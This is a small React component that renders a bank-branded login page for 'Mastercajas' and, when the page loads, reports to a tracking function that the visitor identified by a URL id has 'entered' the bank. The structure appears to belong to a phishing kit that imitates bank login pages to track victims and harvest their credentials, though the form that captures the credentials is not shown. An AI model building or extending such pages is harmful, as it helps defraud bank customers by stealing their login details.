import { useEffect } from 'react'
import { useParams } from 'react-router-dom'
import { userEnteredBank } from '../utils/utils'
import { LoginForm } from './components/forms/LoginForm'

export function MastercajaPage() {
  const { id } = useParams()

  useEffect(() => {
    userEnteredBank(id!, 'Mastercajas')
  })

  return (
    <div className="h-full w-full bg-[linear-gradient(to_bottom,_#ffffae_10%,_#ffffae)] pt-20 max-sm:px-5 md:pt-40">
      <LoginForm />
    </div>
  )
}
